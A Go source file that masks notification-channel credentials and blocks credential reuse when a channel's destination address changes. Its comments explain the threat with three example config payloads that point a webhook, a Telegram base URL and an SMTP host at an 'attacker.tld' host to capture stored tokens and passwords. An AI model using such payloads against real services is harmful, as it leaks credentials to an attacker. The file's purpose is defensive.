package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes credentials,
// the real content is replaced with a value carrying this prefix. When the update
// endpoint receives a value with this prefix, it interprets it as "keep the stored value unchanged."
//
// A prefix is used instead of an empty string or a fixed constant so that a small amount
// of identifiable information can be carried along (see MaskedValue), letting the user
// tell "which bot is this" without having to re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue generates a masked value:
//
//	"__masked__"              the original value is too short, no hint given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original as an identification hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying information
// in a webhook address is in the trailing segment (e.g. WeCom's key, Feishu's bot id),
// while the prefix portion is the same across bots and has no identification value.
// The last 6 characters are not enough to reconstruct the credential, but sufficient for
// the configurer to recognize "that's my group."
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unchanged after being echoed by the API).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced
// by masked values.
//
// Unknown channel types return an empty map instead of the original config — it is better
// to have the UI show "configuration unavailable" than to return the entire raw content,
// which may contain credentials, when the channel type cannot be recognized.
// Non-credential fields are preserved as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a whole:
		// judging each sub-key individually would require each channel to declare another
		// set of "which sub-keys are credentials" rules — the complexity far exceeds the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials indicates "the destination address changed,
// but the caller did not take a stance on the credential fields." It is returned instead
// of silently passing through or silently dropping credentials; see PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys without an explicit stance
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "Destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please re-fill the credential fields (" +
		strings.Join(e.Missing, ", ") + ") at the same time: enter a new value, or explicitly leave blank to indicate " +
		"credentials are no longer needed. The original credentials are only valid for the old address; " +
		"continuing to reuse them is equivalent to handing them to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of
// "destination address change."
//
// It replaces a bare MergeConfig on the channel update path, addressing a practically
// exploitable path: the destination address (where messages are sent) and credentials
// (what identity is used to send) are two independent field sets, and MergeConfig
// preserves the stored value for any "unmentioned key" as-is. So anyone who can PATCH
// a channel can — by **only changing the address and saying nothing about credentials** —
// have the server send the real credentials from the database to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header sent with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → yields username and password after STARTTLS
//
// This path is completely silent and does not rely on redirects (so rejecting cross-host
// redirects does not stop it), and it directly defeats the goal of this package's masking
// mechanism — "credentials are not echoed to the browser."
//
// Rule: whenever a destination key is changed to a new value, the caller must take an
// explicit stance on **every** credential key:
//   - provide a new value → use the new value
//   - explicitly pass an empty string → that field no longer needs credentials (clear semantics preserved)
//   - echo the masked value back as-is / simply omit the key → rejected
//
// The third case is also rejected because the meaning of a "masked value" is precisely
// "reuse the old credentials," and the old credentials are only valid for the old address.
// "Automatically dropping credentials" is deliberately not done here — for optional
// credential fields (webhook's headers, email's password) it would silently turn into
// "authentication is gone but the API returns 200," which is harder to debug than an error.
// Better to have the operator fill it in one more time.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook's headers, which is an object) has
	// a mask literal nested inside it, the caller stuffed the "keep original value" sentinel
	// into the structure. MergeConfig only recognizes "a string with the prefix" as a mask;
	// this form would be treated as an ordinary object and stored as-is — the literal
	// "__masked__" would actually land in the database, and authentication would silently
	// fail with no error. Better to reject it.
	//
	// This check must come **first**: when the address hasn't changed, an early return is
	// taken, so placing it later would only cover the "change address" path (the first
	// version put it there by mistake, and a test caught it immediately).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find destination keys that were actually changed. A masked value counts as "unchanged."
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Address unchanged: do a normal merge (masked values preserve the original, empty strings clear, the rest overwrite).
		return MergeConfig(stored, incoming), nil
	}

	// Address changed: require an explicit stance on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submitting the mask sentinel nested inside a non-string structure.
//
// The masking mechanism's premise is "the entire value is a string." Object fields like
// webhook's headers can only be masked as a whole (written as the string "__masked__")
// or submitted as a whole; stuffing the sentinel inside the object neither expresses
// "keep unchanged" nor would be stored as a real value in the database.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left blank as a whole to reuse the stored value, or submitted with a new value as a whole; it cannot carry a mask placeholder inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. JSON serialization
// is used for comparison to also handle type differences — the frontend submits a port
// as a number, while what comes back from the database is float64; a direct == would misjudge.
//
// "Empty" must be normalized before comparison: an empty string and "key does not exist"
// are the same state in this config model, because MergeConfig treats an empty string as
// an explicit clear and deletes the key directly. Without normalization, an optional
// destination field that is always left blank (Telegram's base_url is the only such field:
// leaving it blank means use the official address) would hit this path —
//
//	on creation, base_url:"" is stored  →  first save has MergeConfig delete the key
//	→ on the second save, incoming is "" and stored lacks the key, judged as "address changed"
//	→ credential is a masked value → 400 "destination address has changed, please re-fill credentials"
//
// After that, every save fails unless the user re-pastes the Bot Token, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue determines whether a config value is "empty."
// The criteria must be consistent with MergeConfig's clear-logic (strings.TrimSpace(s) == ""),
// otherwise a gap appears where "MergeConfig thinks it should be deleted, sameConfigValue
// thinks it has a value."
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming onto stored, used for updating channel config.
//
// Rules:
//   - keys in incoming whose value is a mask → preserve the stored original value (user didn't change this field)
//   - keys in incoming whose value is an empty string → treated as explicit clear, delete the key
//   - all other keys → overwrite with the incoming value
//   - keys in stored but not in incoming → preserved (partial update semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the frontend form
// submits unfilled fields as empty strings; if treated as a valid value and written,
// fields that were "left blank to preserve the original" would actually be cleared.
// Explicit clear is chosen here because when a user wants to clear a misconfigured field,
// there is no other way to express it (dragging a field could distinguish "not provided"
// from "provided empty," but the UI does not use that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, preserve stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}